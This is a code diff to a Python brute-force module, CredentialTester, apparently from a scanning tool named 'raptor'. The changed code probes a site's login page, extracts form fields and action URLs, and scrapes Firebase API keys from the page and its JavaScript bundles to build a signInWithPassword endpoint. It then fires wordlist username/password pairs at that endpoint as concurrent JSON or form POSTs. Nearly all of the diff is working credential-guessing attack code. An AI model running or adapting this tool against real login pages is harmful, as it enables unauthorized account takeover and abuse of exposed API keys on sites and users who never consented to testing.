@@ -62,7 +62,7 @@ class CredentialTester(BaseModule):
     # Entry point
     # ─────────────────────────────────────────────────────────────────────────
     async def run(self, target: str, **kwargs) -> List[Finding]:
-        """Run brute force tests — skips straight to attacking the given URL"""
+        """Run brute force — inserts username+password into the login form and submits"""
         self.logger.info(f"Starting brute force on {target}")
 
         if not kwargs.get('enable_brute_force', False):
@@ -75,18 +75,25 @@ class CredentialTester(BaseModule):
         if kwargs.get('max_usernames'): self._max_usernames  = kwargs['max_usernames']
         if kwargs.get('max_passwords'): self._max_passwords  = kwargs['max_passwords']
 
-        # ── Print wordlist banner ─────────────────────────────────────────────
+        target_url = target if target.startswith(('http://', 'https://')) else f"https://{target}"
+
+        # ── Step 1: fetch the page and extract form fields ────────────────────
+        print(f"\033[96m[*] Probing login page...\033[0m")
+        endpoint = await self._probe_single_endpoint(target_url)
+
+        print(f"\033[96m[*] Form type : \033[93m{endpoint['form_type']}\033[0m")
+        print(f"\033[96m[*] Post URL  : \033[93m{endpoint['url']}\033[0m")
+        print(f"\033[96m[*] User field: \033[93m{endpoint['fields'].get('username_field')}\033[0m")
+        print(f"\033[96m[*] Pass field: \033[93m{endpoint['fields'].get('password_field')}\033[0m")
+
+        # ── Step 2: show wordlist banner ──────────────────────────────────────
         ulist_label = self.custom_userlist or f"{self.wordlist_path}/usernames.txt (default)"
         plist_label = self.custom_passlist or f"{self.wordlist_path}/passwords.txt (default)"
-        print(f"\033[96m[*] Userlist : {ulist_label}\033[0m")
-        print(f"\033[96m[*] Passlist : {plist_label}\033[0m")
+        print(f"\033[96m[*] Userlist  : {ulist_label}\033[0m")
+        print(f"\033[96m[*] Passlist  : {plist_label}\033[0m\n")
 
-        # ── Build endpoint ────────────────────────────────────────────────────
-        target_url = target if target.startswith(('http://', 'https://')) else f"https://{target}"
-        endpoint   = await self._probe_single_endpoint(target_url)
-
-        print(f"\033[96m[*] Form type detected : \033[93m{endpoint['form_type']}\033[0m")
-        print(f"\033[96m[*] Attack URL         : \033[93m{endpoint['url']}\033[0m\n")
+        if endpoint.get('form_type') == 'firebase_key_missing':
+            return self.findings
 
         await self._test_brute_force(endpoint)
         return self.findings
@@ -96,143 +103,115 @@ class CredentialTester(BaseModule):
     # ─────────────────────────────────────────────────────────────────────────
     async def _probe_single_endpoint(self, url: str) -> Dict:
         """
-        Fire ONE request to detect form type.
-
-        Special handling for Firebase / SPA apps
-        ──────────────────────────────────────────
-        Sites like Firebase (*.web.app) render their login via JavaScript.
-        The HTML page itself has no <form> — the login call goes to:
-            https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>
-        We detect the Firebase API key from the page source and build the
-        correct endpoint automatically.
+        Fetch the login page, extract the real form fields and POST url.
+        Works for:
+          - Standard HTML forms  → reads <form action=...> and <input name=...>
+          - Firebase / SPA apps  → detects identitytoolkit and uses email+password
+          - JSON APIs            → detects content-type and uses json body
+        Falls back to email+password POST if detection fails.
         """
-        from urllib.parse import urlparse
         import re
+        from urllib.parse import urlparse, urljoin
+
+        parsed = urlparse(url)
+        base   = f"{parsed.scheme}://{parsed.netloc}"
 
         default_fields = {
             'username_fields': ['email'],
             'password_field':  'password',
             'username_field':  'email',
             'email_field':     'email',
-            'inputs':          [],
-            'action':          '',
-            'method':          'POST',
+            'inputs': [], 'action': '', 'method': 'POST',
         }
 
-        parsed  = urlparse(url)
-        base    = f"{parsed.scheme}://{parsed.netloc}"
-        text    = ""
-        headers = {}
-
-        # ── Fast-path: user passed the Firebase endpoint URL directly ─────────
+        # ── Firebase URL passed directly ──────────────────────────────────────
         if 'identitytoolkit.googleapis.com' in url:
-            print(f"\033[92m[+] Firebase Identity Toolkit URL detected directly\033[0m")
+            print(f"\033[92m[+] Firebase Identity Toolkit URL — using JSON mode\033[0m")
             return {
-                'url':       url,
-                'type':      'firebase',
-                'form_type': 'firebase',
-                'fields': {
-                    'username_fields': ['email'],
-                    'password_field':  'password',
-                    'username_field':  'email',
-                    'email_field':     'email',
-                    'inputs': [], 'action': '', 'method': 'POST',
-                },
-                'is_api': True,
+                'url': url, 'type': 'firebase', 'form_type': 'firebase',
+                'fields': default_fields, 'is_api': True,
             }
 
+        # ── Fetch the page ────────────────────────────────────────────────────
+        text    = ""
+        headers = {}
         try:
-            response = await self._make_request(url)
-            if response:
-                text    = await response.text()
-                headers = response.headers
+            resp = await self._make_request(url)
+            if resp:
+                text    = await resp.text()
+                headers = resp.headers
         except Exception as e:
-            self.logger.warning(f"Probe failed ({e}), using defaults")
+            self.logger.warning(f"Probe failed: {e}")
 
-        # ── Firebase detection ────────────────────────────────────────────────
-        # Look for the Firebase API key embedded in the page or linked JS files
-        firebase_key = None
-        firebase_hints = [
-            'firebase', 'firebaseapp.com', 'identitytoolkit',
-            'web.app', 'firebaseconfig', 'apiKey'
-        ]
-        is_firebase = any(h in text.lower() for h in firebase_hints) or 'web.app' in url or 'firebaseapp.com' in url
+        # ── Firebase SPA detection ────────────────────────────────────────────
+        firebase_hints = ['firebase', 'identitytoolkit', 'firebaseapp', 'firebaseConfig', 'apiKey']
+        is_firebase    = ('web.app' in url or 'firebaseapp.com' in url or
+                          any(h in text for h in firebase_hints))
 
         if is_firebase:
-            # Try to extract the API key directly from inline script
-            key_match = re.search(
-                r'["\']?apiKey["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]+)["\']',
-                text
-            )
-            if key_match:
-                firebase_key = key_match.group(1)
-                print(f"\033[92m[+] Firebase API key found in page source\033[0m")
-            else:
-                # Try to fetch linked JS bundles to find the key
-                js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', text)
-                for js_path in js_urls[:5]:   # check first 5 JS files only
-                    js_url = js_path if js_path.startswith('http') else base + '/' + js_path.lstrip('/')
+            # Try to extract API key from page source
+            key_m = re.search(r'apiKey["\'\s]*[:=]["\'\s]*([A-Za-z0-9_-]{20,})', text)
+            if not key_m:
+                # Scan linked JS bundles
+                js_srcs = re.findall(r'src=["\'](https?://[^"\']+\.js[^"\']*|/[^"\']+\.js[^"\']*)["\']', text)
+                print(f"\033[96m[*] Scanning {len(js_srcs)} JS bundle(s) for Firebase config...\033[0m")
+                for src in js_srcs[:8]:
+                    js_url = src if src.startswith('http') else base + src
                     try:
-                        js_resp = await self._make_request(js_url)
-                        if js_resp:
-                            js_text = await js_resp.text()
-                            km = re.search(
-                                r'["\']?apiKey["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]+)["\']',
-                                js_text
-                            )
-                            if km:
-                                firebase_key = km.group(1)
-                                print(f"\033[92m[+] Firebase API key found in {js_url}\033[0m")
+                        jr = await self._make_request(js_url)
+                        if jr:
+                            jt   = await jr.text()
+                            key_m = re.search(r'apiKey["\'\s]*[:=]["\'\s]*([A-Za-z0-9_-]{20,})', jt)
+                            if key_m:
+                                print(f"\033[92m[+] Found Firebase API key in {src.split('/')[-1]}\033[0m")
                                 break
                     except Exception:
                         pass
 
-            if firebase_key:
-                firebase_url = (
-                    f"https://identitytoolkit.googleapis.com/v1/"
-                    f"accounts:signInWithPassword?key={firebase_key}"
-                )
-                print(f"\033[92m[+] Firebase endpoint : {firebase_url[:80]}...\033[0m")
+            if key_m:
+                fb_url = (f"https://identitytoolkit.googleapis.com/v1/"
+                          f"accounts:signInWithPassword?key={key_m.group(1)}")
+                print(f"\033[92m[+] Firebase endpoint ready\033[0m")
                 return {
-                    'url':       firebase_url,
-                    'type':      'firebase',
-                    'form_type': 'firebase',
-                    'fields':    default_fields,
-                    'is_api':    True,
+                    'url': fb_url, 'type': 'firebase', 'form_type': 'firebase',
+                    'fields': default_fields, 'is_api': True,
                 }
             else:
-                # Firebase app but key not found — tell user exactly what to do and stop
-                print(f"\033[91m[!] Firebase app detected but API key not found automatically.\033[0m")
-                print(f"\033[93m")
-                print(f"  HOW TO GET THE CORRECT TARGET URL:\033[0m")
-                print(f"\033[93m  1. Open Chrome/Firefox and go to: {url}\033[0m")
-                print(f"\033[93m  2. Press F12 → Network tab → clear log\033[0m")
-                print(f"\033[93m  3. Try logging in with ANY credentials\033[0m")
-                print(f"\033[93m  4. Look for a request to: identitytoolkit.googleapis.com\033[0m")
-                print(f"\033[93m  5. Right-click it → Copy → Copy as URL\033[0m")
-                print(f"\033[93m  6. Run raptor with that URL as the target:\033[0m")
-                print(f"\033[96m     python3 raptor.py -t \"<paste URL here>\" --modules brute --enable-brute-force ...\033[0m")
-                print()
-                # Return a dummy endpoint that will produce 0 attempts
+                # Key not found — instruct user and return sentinel
+                print(f"\033[91m[!] Firebase detected but API key not found in page/JS.\033[0m")
+                print(f"\033[93m  Do this in Chrome DevTools (F12 → Network tab):\033[0m")
+                print(f"\033[93m  1. Click \'Start recording\'\033[0m")
+                print(f"\033[93m  2. Submit the login form with any credentials\033[0m")
+                print(f"\033[93m  3. Find the request to identitytoolkit.googleapis.com\033[0m")
+                print(f"\033[93m  4. Copy its full URL and use that as -t target\033[0m")
                 return {
-                    'url':       url,
-                    'type':      'firebase_key_missing',
+                    'url': url, 'type': 'firebase_key_missing',
                     'form_type': 'firebase_key_missing',
-                    'fields':    default_fields,
-                    'is_api':    False,
+                    'fields': default_fields, 'is_api': False,
                 }
 
-        # ── Standard form / API detection ─────────────────────────────────────
-        ft     = self._detect_form_type(url, text, headers)
+        # ── Extract HTML form fields ───────────────────────────────────────────
         fields = self._extract_form_fields(text) if text else default_fields
 
+        # Resolve form action URL
+        post_url = url
+        if fields.get('action'):
+            action = fields['action']
+            if action.startswith('http'):
+                post_url = action
+            elif action.startswith('/'):
+                post_url = base + action
+            else:
+                post_url = urljoin(url, action)
+
+        # Detect form type (json api, graphql, etc)
+        ft = self._detect_form_type(url, text, headers)
+
         return {
-            'url':       url,
-            'type':      'direct',
-            'form_type': ft,
-            'fields':    fields,
-            'is_api':    ft in ('json_api', 'graphql', 'oauth2', 'jwt_login', 'ajax_form', 'firebase'),
+            'url': post_url, 'type': 'direct', 'form_type': ft,
+            'fields': fields, 'is_api': ft in ('json_api','graphql','oauth2','jwt_login','ajax_form'),
         }
+
 
     # ─────────────────────────────────────────────────────────────────────────
     # Discovery (kept for compatibility — no longer called in run())
@@ -627,28 +606,38 @@ class CredentialTester(BaseModule):
                 if found_event.is_set():
                     return
 
-                p = self._build_payload(form_type, username, password, username_fields, password_field)
-
                 try:
                     response = None
-                    if p['use_basic_auth']:
-                        response = await self._make_request(
-                            url, method=p['method'], auth=p['basic_auth_tuple'],
-                            allow_redirects=False, headers=p['headers'])
-                    elif isinstance(p['data'], str):
-                        response = await self._make_request(
-                            url, method=p['method'], data=p['data'],
-                            allow_redirects=False, headers=p['headers'])
-                    elif p['use_json']:
-                        response = await self._make_request(
-                            url, method=p['method'], json=p['data'],
-                            allow_redirects=False, headers=p['headers'])
-                    else:
-                        response = await self._make_request(
-                            url, method=p['method'], data=p['data'],
-                            allow_redirects=False, headers=p['headers'])
 
-                    # ── Update progress bar ───────────────────────────────
+                    # ── Firebase: JSON body with email + password ─────────
+                    if form_type == 'firebase':
+                        response = await self._make_request(
+                            url, method='POST',
+                            json={'email': username, 'password': password, 'returnSecureToken': True},
+                            allow_redirects=False,
+                            headers={'Content-Type': 'application/json'})
+
+                    # ── JSON API ──────────────────────────────────────────
+                    elif form_type in ('json_api', 'jwt_login', 'ajax_form', 'graphql'):
+                        body = {password_field: password}
+                        for f in username_fields:
+                            body[f] = username
+                        response = await self._make_request(
+                            url, method='POST', json=body,
+                            allow_redirects=False,
+                            headers={'Content-Type': 'application/json'})
+
+                    # ── Standard HTML form POST ───────────────────────────
+                    else:
+                        body = {password_field: password}
+                        for f in username_fields:
+                            body[f] = username
+                        response = await self._make_request(
+                            url, method='POST', data=body,
+                            allow_redirects=False,
+                            headers={'Content-Type': 'application/x-www-form-urlencoded'})
+
+                    # ── Progress bar ──────────────────────────────────────
                     counter[0] += 1
                     self._print_progress(
                         counter[0], total_attempts,
@@ -658,7 +647,7 @@ class CredentialTester(BaseModule):
                     if not response:
                         return
 
-                    # ── Rate-limit / lockout check ────────────────────────
+                    # ── Rate-limit / lockout ──────────────────────────────
                     if response.status in [429, 503]:
                         rate_limited[0] = True
                         sys.stdout.write('\n')
@@ -682,7 +671,7 @@ class CredentialTester(BaseModule):
 
                 except Exception as e:
                     counter[0] += 1
-                    self.logger.error(f"Attempt {counter[0]} error: {e}")
+                    self.logger.debug(f"Attempt {counter[0]} error: {e}")
 
         # ── Launch all tasks ──────────────────────────────────────────────────
         tasks = [asyncio.create_task(attempt(u, p))
